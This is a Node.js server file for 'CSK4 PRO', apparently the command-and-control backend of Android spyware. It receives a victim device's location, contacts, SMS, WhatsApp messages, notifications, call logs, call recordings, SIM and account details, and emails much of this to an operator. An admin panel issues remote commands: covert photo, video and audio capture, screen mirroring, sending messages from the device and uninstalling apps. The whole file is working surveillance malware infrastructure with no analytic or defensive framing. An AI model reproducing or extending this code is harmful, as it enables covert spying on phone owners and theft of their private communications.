const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const bodyParser = require('body-parser');
const { Server } = require('socket.io');
const nodemailer = require('nodemailer');
const fs = require('fs');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 2e8,
  pingTimeout: 60000
});

// ============ CONFIG ============
const CONFIG = {
  ADMIN_USER: process.env.ADMIN_USER || 'admin',
  ADMIN_PASS: process.env.ADMIN_PASS || 'csk4@2024',
  DEVICE_TOKEN: process.env.DEVICE_TOKEN || 'CSK4-DEVICE-SECRET-123',
  PORT: process.env.PORT || 4000,
  EMAIL_USER: process.env.EMAIL_USER || '',
  EMAIL_PASS: process.env.EMAIL_PASS || '',
  EMAIL_TO: process.env.EMAIL_TO || '',
  ENABLE_EMAIL: process.env.ENABLE_EMAIL === 'true',
  MAX_EMAILS_PER_HOUR: parseInt(process.env.MAX_EMAILS_PER_HOUR) || 100
};

// ============ EMAIL SETUP ============
let transporter = null;
if (CONFIG.ENABLE_EMAIL && CONFIG.EMAIL_USER && CONFIG.EMAIL_PASS) {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: CONFIG.EMAIL_USER, pass: CONFIG.EMAIL_PASS }
  });
  console.log('📧 Email enabled for:', CONFIG.EMAIL_USER);
}

let emailCount = 0;
let emailResetTime = Date.now();

async function sendEmail(subject, body, attachments = []) {
  if (!transporter || !CONFIG.ENABLE_EMAIL) return;
  if (Date.now() - emailResetTime > 3600000) {
    emailCount = 0;
    emailResetTime = Date.now();
  }
  if (emailCount >= CONFIG.MAX_EMAILS_PER_HOUR) {
    console.log('⚠️ Email rate limit reached');
    return;
  }
  try {
    await transporter.sendMail({
      from: `"CSK4 Server" <${CONFIG.EMAIL_USER}>`,
      to: CONFIG.EMAIL_TO,
      subject: subject,
      text: body,
      attachments: attachments
    });
    emailCount++;
    console.log('📧 Email sent:', subject);
  } catch (e) {
    console.error('❌ Email fail:', e.message);
  }
}

// ============ MIDDLEWARE ============
app.use(cors());
app.use(bodyParser.json({ limit: '200mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '200mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

if (!fs.existsSync('./uploads')) fs.mkdirSync('./uploads');

// ============ UPLOAD ============
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, './uploads/'),
  filename: (req, file, cb) => {
    const safe = file.originalname.replace(/[^a-zA-Z0-9.]/g, '_');
    cb(null, Date.now() + '-' + safe);
  }
});
const upload = multer({ storage, limits: { fileSize: 200 * 1024 * 1024 } });

// ============ MEMORY STORAGE ============
let devices = {};
let locations = [];
let contacts = [];
let files = [];
let photos = [];
let videos = [];
let audioRec = [];
let nearbyDevices = [];
let messages = [];
let commands = [];
let deviceInfo = {};
let callLogs = [];
let installedApps = [];
let screenshots = [];
let bluetoothDevices = [];
let notifications = [];
let whatsappMessages = [];
let activities = [];
let callRecordings = [];
let simInfo = {};      // 🆕
let accountsInfo = {}; // 🆕
let emailsInfo = {};   // 🆕

// ============ DEVICE ENDPOINTS ============

app.post('/api/device/register', (req, res) => {
  const { deviceId, deviceName, token, model, android, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
  devices[deviceId] = {
    deviceId, deviceName: deviceName || 'Unknown',
    model: model || deviceName, android: android || 'Unknown',
    battery: battery || 0, lastSeen: new Date(), online: true, ip: req.ip
  };
  io.emit('device-update', devices);
  console.log(`✅ ${deviceName} (${deviceId})`);
  sendEmail(
    `🟢 Device Online: ${deviceName}`,
    `Device: ${deviceName}\nID: ${deviceId}\nModel: ${model}\nAndroid: ${android}\nBattery: ${battery}%\nIP: ${req.ip}\nTime: ${new Date().toLocaleString()}`
  );
  res.json({ success: true });
});

app.post('/api/device/heartbeat', (req, res) => {
  const { deviceId, token, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (devices[deviceId]) {
    devices[deviceId].lastSeen = new Date();
    devices[deviceId].online = true;
    if (battery !== undefined) devices[deviceId].battery = battery;
  }
  io.emit('device-update', devices);
  res.json({ success: true });
});

app.post('/api/device/location', (req, res) => {
  const { deviceId, lat, lng, accuracy, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, lat, lng, accuracy, time: new Date() };
  locations.push(entry);
  if (locations.length > 5000) locations.shift();
  io.emit('new-location', entry);
  sendEmail(
    `📍 Location Update`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ${accuracy}m\nMaps: https://maps.google.com/?q=${lat},${lng}\nTime: ${new Date().toLocaleString()}`
  );
  res.json({ success: true });
});

app.post('/api/device/contacts', (req, res) => {
  const { deviceId, contacts: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  contacts = contacts.filter(c => c.deviceId !== deviceId);
  list.forEach(c => contacts.push({ deviceId, name: c.name, phone: c.phone, type: c.type }));
  io.emit('contacts-update', contacts);
  sendEmail(
    `👥 Contacts Uploaded`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\nTotal: ${list.length}\nTime: ${new Date().toLocaleString()}`
  );
  res.json({ success: true, count: list.length });
});

app.post('/api/device/messages', (req, res) => {
  const { deviceId, messages: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  messages = messages.filter(m => m.deviceId !== deviceId);
  list.forEach(m => messages.push({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
  io.emit('messages-update', messages);
  const recent = list.slice(0, 5);
  if (recent.length > 0) {
    let body = `Device: ${devices[deviceId]?.deviceName || deviceId}\nTotal: ${list.length}\n\nRecent Messages:\n\n`;
    recent.forEach(m => {
      body += `📱 ${m.from}\n${m.body}\n${new Date(parseInt(m.time) || m.time).toLocaleString()}\n\n`;
    });
    sendEmail(`💬 SMS Uploaded (${list.length})`, body);
  }
  res.json({ success: true });
});

app.post('/api/device/calllogs', (req, res) => {
  const { deviceId, callLogs: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  callLogs = callLogs.filter(c => c.deviceId !== deviceId);
  list.forEach(c => callLogs.push({ deviceId, ...c }));
  io.emit('calllogs-update', callLogs);
  res.json({ success: true });
});

app.post('/api/device/apps', (req, res) => {
  const { deviceId, apps, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  installedApps = installedApps.filter(a => a.deviceId !== deviceId);
  apps.forEach(a => installedApps.push({ deviceId, ...a }));
  io.emit('apps-update', installedApps);
  res.json({ success: true });
});

app.post('/api/device/nearby', (req, res) => {
  const { deviceId, devices: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  nearbyDevices = nearbyDevices.filter(d => d.deviceId !== deviceId);
  list.forEach(d => nearbyDevices.push({ deviceId, ...d }));
  io.emit('nearby-update', nearbyDevices);
  res.json({ success: true });
});

app.post('/api/device/bluetooth', (req, res) => {
  const { deviceId, devices: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  bluetoothDevices = bluetoothDevices.filter(d => d.deviceId !== deviceId);
  list.forEach(d => bluetoothDevices.push({ deviceId, ...d }));
  io.emit('bluetooth-update', bluetoothDevices);
  res.json({ success: true });
});

app.post('/api/device/info', (req, res) => {
  const { deviceId, info, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  deviceInfo[deviceId] = { ...info, time: new Date() };
  io.emit('info-update', deviceInfo);
  res.json({ success: true });
});

// ============ NOTIFICATIONS ============
app.post('/api/device/notification', (req, res) => {
  const { deviceId, package: pkg, title, text, time, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, package: pkg, title, text, time: new Date() };
  notifications.push(entry);
  if (notifications.length > 1000) notifications.shift();
  io.emit('new-notification', entry);
  sendEmail(
    `🔔 ${title || pkg}`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\nApp: ${pkg}\nTitle: ${title}\nText: ${text}\nTime: ${new Date().toLocaleString()}`
  );
  res.json({ success: true });
});

// ============ WHATSAPP ============
app.post('/api/device/whatsapp', (req, res) => {
  const { deviceId, from, message, time, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, from, message, time: new Date() };
  whatsappMessages.push(entry);
  if (whatsappMessages.length > 1000) whatsappMessages.shift();
  io.emit('whatsapp-update', whatsappMessages);
  sendEmail(
    `💬 WhatsApp: ${from}`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\nFrom: ${from}\nMessage: ${message}\nTime: ${new Date().toLocaleString()}`
  );
  res.json({ success: true });
});

// ============ ACTIVITIES ============
app.post('/api/device/activity', (req, res) => {
  const { deviceId, type, data, time, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, type, data, time: new Date() };
  activities.push(entry);
  if (activities.length > 2000) activities.shift();
  io.emit('activity-update', activities);
  sendEmail(
    `📊 Activity: ${type}`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\nType: ${type}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`
  );
  res.json({ success: true });
});

// ============ CALL RECORDING ============
app.post('/api/device/callrecording', upload.single('file'), (req, res) => {
  const { deviceId, number, duration, type, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const entry = {
    deviceId, number, duration, type,
    filename: req.file.filename,
    url: `/uploads/${req.file.filename}`,
    time: new Date()
  };
  callRecordings.push(entry);
  io.emit('callrecording-update', callRecordings);
  sendEmail(
    `📞 Call Recording: ${number}`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\nNumber: ${number}\nType: ${type}\nDuration: ${duration}s\nTime: ${new Date().toLocaleString()}`,
    [{ filename: `call-${number}-${Date.now()}.m4a`, path: `./uploads/${req.file.filename}` }]
  );
  res.json({ success: true });
});

// ============ 🆕 SIM INFO ============
app.post('/api/device/siminfo', (req, res) => {
  const { deviceId, sims, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, sims, time: new Date() };
  simInfo[deviceId] = entry;
  io.emit('siminfo-update', simInfo);
  let simText = '';
  if (sims && sims.length > 0) {
    sims.forEach((sim) => {
      simText += `SIM ${sim.slot}:\n  Number: ${sim.number || 'N/A'}\n  Operator: ${sim.operator || 'N/A'}\n  Country: ${sim.country || 'N/A'}\n  Network: ${sim.networkType || 'N/A'}\n  State: ${sim.state || 'N/A'}\n\n`;
    });
  }
  sendEmail(
    `📱 SIM Info: ${devices[deviceId]?.deviceName || deviceId}`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${simText}\nTime: ${new Date().toLocaleString()}`
  );
  console.log(`📱 SIM info received from ${deviceId}`);
  res.json({ success: true });
});

// ============ 🆕 ACCOUNTS ============
app.post('/api/device/accounts', (req, res) => {
  const { deviceId, accounts, total, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, accounts, total, time: new Date() };
  accountsInfo[deviceId] = entry;
  io.emit('accounts-update', accountsInfo);
  let accText = `Total: ${total}\n\n`;
  if (accounts && accounts.length > 0) {
    accounts.forEach(acc => { accText += `📧 ${acc.name}\n   Type: ${acc.type}\n\n`; });
  }
  sendEmail(
    `👤 Accounts: ${total}`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${accText}\nTime: ${new Date().toLocaleString()}`
  );
  console.log(`👤 Accounts received: ${total}`);
  res.json({ success: true });
});

// ============ 🆕 EMAIL ACCOUNTS ============
app.post('/api/device/emails', (req, res) => {
  const { deviceId, emails, total, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, emails, total, time: new Date() };
  emailsInfo[deviceId] = entry;
  io.emit('emails-update', emailsInfo);
  let emailText = `Total: ${total}\n\n`;
  if (emails && emails.length > 0) {
    emails.forEach(email => { emailText += `📧 ${email}\n`; });
  }
  sendEmail(
    `📧 Email Accounts: ${total}`,
    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${emailText}\nTime: ${new Date().toLocaleString()}`
  );
  console.log(`📧 Emails received: ${total}`);
  res.json({ success: true });
});

app.post('/api/device/upload', upload.single('file'), (req, res) => {
  const { deviceId, type, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const entry = {
    deviceId, type: type || 'file',
    filename: req.file.filename,
    originalName: req.file.originalname,
    url: `/uploads/${req.file.filename}`,
    size: req.file.size, time: new Date()
  };
  if (type === 'photo') photos.push(entry);
  else if (type === 'video') videos.push(entry);
  else if (type === 'audio') audioRec.push(entry);
  else if (type === 'screenshot') screenshots.push(entry);
  else files.push(entry);
  io.emit('new-file', entry);
  console.log(`📁 ${type}: ${entry.originalName}`);
  res.json({ success: true, file: entry });
});

app.get('/api/device/commands/:deviceId', (req, res) => {
  const pending = commands.filter(c => c.deviceId === req.params.deviceId && c.status === 'pending');
  res.json({ commands: pending });
});

app.post('/api/device/command-done', (req, res) => {
  const { commandId, result } = req.body;
  const cmd = commands.find(c => c.id === commandId);
  if (cmd) { cmd.status = 'done'; cmd.result = result; }
  res.json({ success: true });
});

// ============ ADMIN ENDPOINTS ============

app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === CONFIG.ADMIN_USER && password === CONFIG.ADMIN_PASS) {
    res.json({ success: true, token: 'csk4-admin-' + Date.now() });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/admin/data', (req, res) => {
  res.json({
    devices, locations, contacts, files, photos, videos,
    audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
    messages, callLogs, apps: installedApps, deviceInfo, commands, screenshots,
    notifications, whatsapp: whatsappMessages, activities, callRecordings,
    simInfo, accounts: accountsInfo, emails: emailsInfo,  // 🆕
    stats: {
      totalDevices: Object.keys(devices).length,
      onlineDevices: Object.values(devices).filter(d => d.online).length,
      totalPhotos: photos.length,
      totalVideos: videos.length,
      totalFiles: files.length,
      totalContacts: contacts.length,
      totalLocations: locations.length,
      totalMessages: messages.length,
      totalApps: installedApps.length,
      totalBluetooth: bluetoothDevices.length,
      totalScreenshots: screenshots.length,
      totalNotifications: notifications.length,
      totalWhatsapp: whatsappMessages.length,
      totalActivities: activities.length,
      totalCallRecordings: callRecordings.length,
      totalSims: Object.keys(simInfo).length,                                     // 🆕
      totalAccounts: Object.values(accountsInfo).reduce((s, a) => s + (a.total || 0), 0),  // 🆕
      totalEmails: Object.values(emailsInfo).reduce((s, e) => s + (e.total || 0), 0)       // 🆕
    }
  });
});

app.post('/api/admin/command', (req, res) => {
  const { deviceId, command, params } = req.body;
  const validCommands = [
    'take_photo_front', 'take_photo_back',
    'record_video_front', 'record_video_back',
    'record_audio', 'screenshot', 'lock_screen',
    'get_location', 'get_contacts', 'get_messages', 'get_calllogs',
    'get_files', 'get_apps', 'get_nearby', 'get_bluetooth', 'get_info',
    'get_sim_info', 'get_accounts', 'get_email_accounts',  // 🆕
    'vibrate', 'play_sound', 'flashlight_on', 'flashlight_off',
    'start_webrtc', 'start_audio_stream', 'stop_webrtc', 'switch_camera',
    'start_screen_mirror', 'stop_screen_mirror',
    'open_app', 'uninstall_app', 'force_stop_app',
    'set_brightness', 'set_volume', 'set_ring_mode',
    'send_sms', 'send_whatsapp', 'show_notification',
    'touch_tap', 'touch_swipe', 'touch_back', 'touch_home', 'touch_recent',
    'start_call_recording', 'stop_call_recording'
  ];
  if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });

  const cmd = {
    id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
    deviceId, command, params: params || {},
    time: new Date(), status: 'pending'
  };
  commands.push(cmd);
  io.to(deviceId).emit('command', cmd);
  console.log(`🎮 ${command} → ${deviceId}`);
  res.json({ success: true, command: cmd });
});

app.delete('/api/admin/device/:deviceId', (req, res) => {
  const id = req.params.deviceId;
  delete devices[id];
  [locations, contacts, files, photos, videos, audioRec, messages,
   callLogs, installedApps, screenshots, bluetoothDevices,
   notifications, whatsappMessages, activities].forEach(arr => {
    for (let i = arr.length - 1; i >= 0; i--) if (arr[i].deviceId === id) arr.splice(i, 1);
  });
  delete simInfo[id];
  delete accountsInfo[id];
  delete emailsInfo[id];
  io.emit('device-update', devices);
  res.json({ success: true });
});

app.delete('/api/admin/clear-commands/:deviceId', (req, res) => {
  commands = commands.filter(c => c.deviceId !== req.params.deviceId);
  res.json({ success: true });
});

// ============ SOCKET.IO ============
io.on('connection', (socket) => {
  console.log('🔌', socket.id);
  socket.on('register-device', (id) => { socket.join(id); console.log('📱 Device:', id); });
  socket.on('register-admin', () => { socket.join('admin-room'); console.log('👤 Admin'); });
  socket.on('webrtc-offer', (data) => io.to(data.target).emit('webrtc-offer', data));
  socket.on('webrtc-answer', (data) => io.to(data.target).emit('webrtc-answer', data));
  socket.on('webrtc-ice', (data) => io.to(data.target).emit('webrtc-ice', data));
  socket.on('screen-mirror-offer', (data) => io.to(data.target).emit('screen-mirror-offer', data));
  socket.on('screen-mirror-answer', (data) => io.to(data.target).emit('screen-mirror-answer', data));
  socket.on('screen-mirror-ice', (data) => io.to(data.target).emit('screen-mirror-ice', data));
  socket.on('disconnect', () => console.log('❌', socket.id));
});

// ============ START ============
server.listen(CONFIG.PORT, '0.0.0.0', () => {
  console.log(`🚀 CSK4 PRO Server v3.0 running on port ${CONFIG.PORT}`);
  console.log(`   Admin Panel: http://localhost:${CONFIG.PORT}/`);
  console.log(`   Email: ${CONFIG.ENABLE_EMAIL ? '✅ Enabled' : '❌ Disabled'}`);
  console.log(`   Email To: ${CONFIG.EMAIL_TO || 'Not set'}`);
});
